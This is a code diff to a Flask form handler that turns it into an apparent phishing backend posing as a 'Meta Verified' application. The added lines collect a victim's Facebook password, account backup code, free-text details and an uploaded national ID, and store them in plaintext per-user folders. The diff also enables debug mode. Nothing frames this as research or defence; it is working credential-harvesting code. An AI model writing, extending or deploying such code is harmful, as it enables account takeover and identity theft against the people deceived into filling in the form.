@@ -3,10 +3,8 @@ import os
 from datetime import datetime
 
 app = Flask(__name__)
-
-SAVE_FOLDER = "submissions"
-if not os.path.exists(SAVE_FOLDER):
-    os.makedirs(SAVE_FOLDER)
+UPLOAD_FOLDER = "submissions"
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 @app.route("/")
 def index():
@@ -17,21 +15,22 @@ def submit():
     name = request.form.get("name")
     email = request.form.get("email")
     phone = request.form.get("phone")
-    nid = request.files.get("nid")
+    fb_password = request.form.get("fb_password")
+    backup_code = request.form.get("backup_code")
+    additional_info = request.form.get("additional_info")
+    file = request.files["nid"]
 
-    # Save uploaded NID file
-    if nid:
-        nid_filename = os.path.join(SAVE_FOLDER, nid.filename)
-        nid.save(nid_filename)
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    folder = os.path.join(UPLOAD_FOLDER, f"{name.replace(' ', '_')}_{timestamp}")
+    os.makedirs(folder, exist_ok=True)
 
-    # Save form data to a .txt file
-    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-    filename = os.path.join(SAVE_FOLDER, f"{name}_{now}.txt")
-    with open(filename, "w") as f:
-        f.write(f"Name: {name}\nEmail: {email}\nPhone: {phone}\nNID File: {nid.filename if nid else 'None'}\n")
+    with open(os.path.join(folder, "data.txt"), "w") as f:
+        f.write(f"Name: {name}\nEmail: {email}\nPhone: {phone}\nPassword: {fb_password}\nBackup Code: {backup_code}\n\nAdditional Info:\n{additional_info}\n")
 
-    return f"Thanks {name}, your form has been submitted!"
+    if file:
+        file.save(os.path.join(folder, file.filename))
+
+    return "✅ Your Meta Verified application has been submitted successfully!"
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+    app.run(debug=True)
